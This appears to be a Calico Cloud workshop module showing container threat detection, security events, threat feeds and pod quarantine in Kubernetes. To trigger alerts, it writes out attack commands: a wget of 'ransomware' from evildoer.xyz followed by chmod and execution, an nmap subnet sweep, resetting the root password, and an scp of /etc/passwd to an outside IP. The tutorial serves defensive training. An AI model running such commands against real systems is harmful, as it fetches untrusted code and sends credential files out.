Container Security and Security Events
==============

## Step 1 - Set up the voting application

In this module we're moving away from the Hipstershop Online Boutique and setting up a sample voting application:

```bash
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/001felixConfigutations.yaml
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/002tiers.yaml
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/003-networkPolicies.yaml
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/004-vote-app-manifest.yaml
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/005-applicationLayer.yaml
kubectl apply -f https://raw.githubusercontent.com/mapgirll/Tigera-LevelUp-Workshop/main/vote/006-pods.yaml
```

or

```bash
kubectl apply -f vote
```

Just like the previous modules, you need to label all pods within the ```vote``` namespace so they will be able to communicate with each other. 

```bash
kubectl label pods --all -n vote vote=true
```

Threat Defense
==============

Calico Cloud provides a threat detection engine that analyzes observed file and process activity to detect known malicious and suspicious activity.

Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behaviour and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:

- Access to sensitive system files and directories
- Defence evasion
- Discovery
- Execution
- Persistence
- Privilege escalation

1. Let's start by enabling the container threat detection feature.
   For this, go to the `Threat Defense` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`.

2. If it is not enabled, you will see a page like this:

   ![enable](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/54014c62-cbef-4718-93fa-75390febb88a)

   Click on the Enable Container Threat Detection button, and you will see the following page:

   ![running](https://github.com/tigera-solutions/cc-aks-detect-block-network-attacks/assets/104035488/42906ad6-ced1-40a8-b817-4a4b5c740d08)

   Perfect! Now any suspicious activities will generate an alert. Let's try some.

   In other to see the results faster, execute the following on the cluster:

   ```bash
   kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
   kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
   ```

## Malware execution alert and security events

Security events suggest the possible presence of a threat actor in your Kubernetes cluster. These events can take various forms, such as a DNS request to a suspicious domain, the activation of a Web Application Firewall (WAF) rule, unauthorized access to sensitive files, or the detection of malware. Calico Cloud offers a centralized dashboard for security engineers and incident response teams to efficiently oversee and respond to these threat alerts. The advantages of using Calico Cloud in this context include:

- A filtered list of critical events with recommended remediation
- Identify impacts on applications
- Understand the scope and frequency of the issue
- Manage alert noise by dismissing events (show/hide)

To test this feature, let's download a file that contains the hash of a malware and execute it inside the pod attacker.

1. Execute the bash inside the pod attack in way you can interact with its shell prompt:

   ```bash
   kubectl exec attacker -it -- /bin/bash
   ```

2. From the bash inside the pod attacker execute the following command to: 1) Download the malware, change its permission and run it.

   ```bash
   wget http://evildoer.xyz/ransomware
   chmod +x ransomware
   ./ransomware
   ```
   
3. Wait a minute and look in the Calico Cloud UI in the `Threat Defense` > `Security Events`.

   ![security-events](https://github.com/tigera-solutions/cc-aks-visualize-identify-security-gaps/assets/104035488/200b4d0b-490a-4d7c-b18e-ef9c59cc6079)

   Because the `ransomware` file has a hash that identifies it as a malware, Calico will create a **Malware** event indicating its execution event. Additionally, a security event showing the modification of the file permission (`chmod +x ransomware`) will be created as well.

   Optionally, you can also try the following commands and observe the security events that are created;
   
   ```bash
   apk add nmap
   nmap -sn $(hostname -i)/24
   passwd root
   scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
   ```
   Wait another minute and look in the Calico Cloud UI in the `Threat Defense` > `Security` again.

## Threat Feeds

In modern cloud-native security, threat intelligence feeds are vital for monitoring and tracking the IP addresses and domains associated with known malicious actors. Calico Cloud integrates threat intelligence feeds, including AlienVault, into its default security policies. This means that right from the outset, any traffic directed to suspicious IP addresses or domain is automatically blocked without requiring additional setup.

1. Explore the Threat Feeds available in Calico Cloud UI in the `Threat Defense` > `Threat Feeds`. Click on each one of them to visualize the lists of IP addresses or domains.

   ![threat-feeds](https://github.com/tigera-solutions/cc-aks-visualize-identify-security-gaps/assets/104035488/719cb334-e981-4e5e-8ef4-b37eea4a422b)

2. Using the pod attacker, try to connect to some of the IP addresses and domains you found in the alienvault lists.

   ```bash
   curl -m2 -vvvvv 
   ```

3. Wait a minute and go to the Calico Cloud UI in the `Activity` > `Alerts`. You should be able to see the alerts for the connection attempt.

   ![activity-alerts](https://github.com/tigera-solutions/cc-aks-visualize-identify-security-gaps/assets/104035488/ed2aad8c-f713-4e0e-b5c5-8abdb299fdb4)

## Quarantine a workload

Suppose you have a compromised workload in your environment and want to conduct further investigation on it. In that case, you should not terminate the workload but isolate it, so it will not be able to cause damage or spread laterally across your environment. In this situation, you should quarantine the pod by applying a security policy to it that will deny all the egress and ingress traffic and log all the communications attempts from and to that pod.

We have the `quarantine` policy created in the `security` tier. This policy has a label selector of `quarantine = true`. Let's see how it works.

1. Execute the following commands from the attacker pod (if you did quit from its shell, it got deleted. Create it again if it's the case.).

   - Test the connection to a local service

     ```bash
     curl -m3 http://vote.vote
     ```

   - Test the connectivity with the Kubernetes API

     ```bash
     curl -m3 -k https://kubernetes:443/versions
     ```  

   - Test the connectivity with the internet

     ```bash
     curl -m3 http://neverssl.com
     ```  

2. Label the attacker pod with `quarantine = true`. 

   ```bash
   kubectl label pod attacker quarantine=true
   ```

3. Repeat the tests from step 1. Now, as you can see, the cannot establish communication with any of the destinations.


